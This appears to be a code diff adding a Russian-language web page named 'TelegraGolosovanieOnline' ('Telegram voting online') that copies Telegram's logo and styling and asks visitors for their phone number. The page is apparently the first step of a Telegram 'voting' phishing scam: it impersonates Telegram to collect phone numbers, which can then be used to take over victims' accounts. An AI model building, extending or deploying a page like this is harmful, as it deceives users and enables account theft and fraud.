@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>TelegraGolosovanieOnline</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #121212;
+      color: #ffffff;
+      margin: 0;
+      padding: 2em;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .form-container {
+      background: #1e1e1e;
+      padding: 2em;
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+      width: 100%;
+      max-width: 400px;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 1em;
+      color: #ffffff;
+    }
+    .input-group {
+      margin-bottom: 1em;
+    }
+
+    .logo {
+      width: 80px;
+      height: auto;
+      margin-bottom: 20px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5em;
+      font-weight: bold;
+      color: #ffffff;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 0.75em;
+      border: 1px solid #444;
+      border-radius: 8px;
+      box-sizing: border-box;
+      font-size: 1em;
+      background-color: #2c2c2c;
+      color: #ffffff;
+    }
+    input::placeholder {
+      color: #999999;
+    }
+    button {
+      width: 100%;
+      padding: 0.75em;
+      background-color: #3390ec;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 1em;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #2b7bc4;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+    <h1>Введите номер телефона</h1>
+    <form method="post">
+      <div class="input-group">
+        <label for="phone">Телефон</label>
+        <input type="text" id="phone" name="phone" placeholder="+7 900 000-00-00" required />
+      </div>
+      <button type="submit">Продолжить</button>
+    </form>
+  </div>
+</body>
+</html>
